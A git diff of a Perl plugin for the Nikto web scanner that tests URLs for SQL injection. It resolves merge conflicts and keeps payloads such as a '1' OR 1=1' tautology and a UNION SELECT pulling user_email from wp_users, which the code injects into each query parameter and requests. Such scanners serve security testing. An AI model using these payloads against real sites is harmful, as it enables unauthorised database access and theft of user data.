@@ -35,14 +35,13 @@ sub nikto_sql_injector_init {
 sub nikto_sql_injector {
 	use URI;
     use URI::QueryParam;
-   
+    
 
     my ($mark, $parameters) = @_;
     my ($found, @urls,);
     my (%flags, %files);
 
     # these are examples from my 'classification section'
-<<<<<<< HEAD
     $sql_injections{'tautology'} = "1' OR 1=1";
     $sql_injections{'illegal'} = "1' AND 2=9";
     $sql_injections{'union'} = "1' UNION ALL SELECT user_email from wp_users";
@@ -53,39 +52,17 @@ sub nikto_sql_injector {
     # process the queries, re-making them with injecions
     foreach my $injection (values %sql_injections) {
     	
-=======
-    $sql_injections{'tautology'} = "'+AND+1=1";
-    $sql_injections{'illegal'} = "'+AND+2=9";
-    $sql_injections{'union'} = "'+UNION+ALL+SELECT+user_email+from+wp_users";
-    $sql_injections{'piggy'} = "';+select+user_email+from+wp_users";
-
-    $flags{'nohost'} = 1;
-
-   
-    # process the queries, re-making them with injecions
-    foreach my $injection (values %sql_injections) {
-
-        
->>>>>>> c8714c0584f859fcb47adbda2e57f7ef375484d4
     	# create another object with the original url
 		my $uri = URI->new( $parameters->{'url'} );
 		
 		#loop and replace each query with the injected version
 		foreach my $key ($uri->query_param) {
-<<<<<<< HEAD
             
-=======
-			
->>>>>>> c8714c0584f859fcb47adbda2e57f7ef375484d4
             #clone the original uri
             $new_uri = $uri->clone;
             #update the parameter with the new injected version
             $new_uri->query_param($key, $injection);
-<<<<<<< HEAD
             print $new_uri->query."\n";
-=======
-		     
->>>>>>> c8714c0584f859fcb47adbda2e57f7ef375484d4
 	        # store it as the key in the url array
 	        $urls{ "?".$new_uri->query } = 1;
 		}
@@ -99,11 +76,7 @@ sub nikto_sql_injector {
         return if $mark->{'terminate'};
 
         # request by hostname
-<<<<<<< HEAD
         my ($res, $content, $error, $request, $response) = nfetch($mark, $uri, "GET", "", "", "", "sql_injector");
-=======
-        my ($res, $content, $error, $request, $response) = nfetch($mark, $item, "GET", "", "", "", "sql_injector");
->>>>>>> c8714c0584f859fcb47adbda2e57f7ef375484d4
 
 
         if ($res eq "200") {
